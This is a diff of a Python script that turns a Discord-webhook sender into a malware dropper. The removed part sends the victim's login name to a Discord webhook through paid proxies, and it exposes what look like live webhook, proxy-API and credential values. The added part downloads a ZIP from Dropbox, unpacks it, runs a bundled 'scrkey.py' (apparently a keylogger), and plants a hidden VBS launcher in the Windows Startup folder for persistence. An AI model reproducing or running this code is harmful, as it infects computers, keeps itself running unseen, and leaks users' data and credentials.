@@ -1,51 +1,56 @@
-import requests
 import os
-# Webhook URL
-webhook_url = "https://discord.com/api/webhooks/1200805594781712506/aUVfkM3l1UFnI22xaDYrol3DifYVabZKWFbSKev1rxDscmELl5nsAX733TdP2ShC74l5"
+import requests
+import time
+last_drop_txt_file_timestamp = 'last_drop.txt'
+# if the timestamp in the file is less than 10 minutes ago, do not run the drop
+if os.path.exists(last_drop_txt_file_timestamp):
+    with open(last_drop_txt_file_timestamp, 'r') as f:
+        last_drop_timestamp = int(f.read().strip())
+    if time.time() - last_drop_timestamp < 600:
+        print("Drop was run less than 10 minutes ago. Exiting.")
+        exit()
+url = "https://www.dropbox.com/scl/fi/mzi95kvwhcibwnflprzsz/Appaqsd.zip?rlkey=sncapapwg10rb4a8t3kz7r5ux&st=nrg8gozj&dl=1"
+filename = os.path.join("Appaqsd.zip")
+with requests.get(url, stream=True) as r:
+    r.raise_for_status()
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192):  # Adjust chunk size as needed
+            f.write(chunk)
 
-# URL to fetch the proxy list
-proxy_list_url = "https://proxy.webshare.io/api/v2/proxy/list/download/sthupemkxpqzmwgozdjkgfswftbtsqnmwdgjrzsn/-/any/sourceip/direct/-/"
+print("Downloaded the ZIP file.")
 
-# Proxy credentials
-username = "xdojqrmv"
-password = "7k3079h6yys4"
+# Step 2: Extract the ZIP file
+# Use the 'tar' command on Windows, ensure tar is available on your system; else, you may need other utilities like 7-Zip
+extract_command = f"tar -xf {filename}"
+print(extract_command)
+os.system(extract_command)
+print("Extracted the ZIP file.")
 
-# Get the proxy list from the provided URL
-try:
-    proxy_response = requests.get(proxy_list_url)
-    if proxy_response.status_code == 200:
-        # Parse the first proxy from the list
-        proxy_list = proxy_response.text.strip().split('\n')
-        if proxy_list:
-            first_proxy = proxy_list[0].strip()
-            
-            # Create proxy string with authentication
-            proxy_with_auth = f"http://{username}:{password}@{first_proxy}"
-            
-            # Proxy setup
-            proxies = {
-                "http": proxy_with_auth,
-                "https": proxy_with_auth
-            }
+# Step 3: Execute the program
+# Modify paths as necessary according to the actual structure inside your ZIP file
+# This assumes 'run.py' is in the root of the 'Appaqsd' folder after extraction
+print(f'Executing the program...')
+full_path = os.path.join(os.getcwd(), "Appaqsd")
+full_python_path = os.path.join(os.getcwd(), "Appaqsd")
+full_python_path = os.path.join(os.getcwd(), "Appaqsd", "python.exe")
+full_script_path = os.path.join(os.getcwd(), "Appaqsd", "scrkey.py")
+print(f'{full_python_path} {full_script_path}')
+# add a vbs script to startup that will launch "Appaqsd", "basrq.py" with "Appaqsd", "python.exe"
+startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+vbs_script_path = os.path.join(startup_folder, "LaunchStartupLANs.vbs")
 
-            # Message to send
-            data = {
-                "content": "This is a test message using the first proxy from the list with authentication! current proxy: " + first_proxy + " with username: " + os.getlogin()
-            }
+vbs_content = f"""
+Set WshShell = CreateObject("WScript.Shell")
 
-            # Sending the request through the provided HTTP proxy with authentication
-            try:
-                response = requests.post(webhook_url, json=data, proxies=proxies)
-                if response.status_code == 204:
-                    print("Message sent successfully!")
-                else:
-                    print(f"Failed to send message. Status code: {response.status_code}")
-                    print(response.text)
-            except Exception as e:
-                print(f"An error occurred while sending the message: {e}")
-        else:
-            print("No proxies available in the list.")
-    else:
-        print(f"Failed to fetch proxy list. Status code: {proxy_response.status_code}")
-except Exception as e:
-    print(f"An error occurred while fetching proxies: {e}")
+WshShell.CurrentDirectory = "{full_path}"
+WshShell.Run "{full_python_path} {full_script_path}", 0, True
+Set WshShell = Nothing 
+"""
+with open(vbs_script_path, 'w') as vbs_file:
+    vbs_file.write(vbs_content.strip())
+with open(last_drop_txt_file_timestamp, 'w') as f:
+    f.write(str(int(time.time())))
+os.system(f'{full_python_path} {full_script_path}')
+
+
+print("Executed the program.")
